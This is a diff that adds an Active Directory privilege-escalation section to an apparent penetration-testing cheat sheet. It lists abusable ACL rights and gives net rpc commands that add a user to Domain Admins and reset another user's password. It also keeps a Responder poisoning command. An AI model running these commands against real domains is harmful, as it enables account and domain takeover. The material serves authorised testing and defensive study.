@@ -495,3 +495,41 @@ On a real lan network, the responder will attempt to poison all Link-Local Multi
 ```bash
 responder -I eth0 -v
 ```
+
+## Privilege Escalation Abusing Active Directory ACLs/ACEs
+
+| ID | Description |
+|----|------------|
+| GenericAll             |full rights to the object (add users to a group or reset user's password)  |
+| GenericWrite           | update object's attributes (i.e logon script)                             |
+| WriteOwner             | change object owner to attacker controlled user take over the object      |
+| WriteDACL              | modify object's ACEs and give attacker full control right over the object |
+| AllExtendedRights      | ability to add user to a group or reset password                          |
+| ForceChangePassword    | ability to change user's password                                         |
+| Self (Self-Membership) | ability to add yourself to a group                                        |
+
+- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces
+
+### GenericALL permission
+
+-> Find domain admins 
+```bash
+net group "Domain Admins" /domain
+```
+
+-> Linux (add user to domain admins group)
+```bash
+net rpc group addmem "Domain Admins" "<USER>" -U "<DOMAIN>"/"<USER>"%"<PASSWORD>" -S "<DC-IP>"
+```
+
+-> List users domain admins group
+```bash
+proxychains net rpc group members "Domain Admins" -U "<DOMAIN>"/"<USER>"%"<PASSWORD>" -S "<DC-IP>"
+```
+
+### ALLExtendedRights
+
+-> Reset password user
+```
+net rpc password "<target-user>" "<new-password>" -U "<domain>"/"<user>"%"<password>" -S "<dc-ip>"
+```
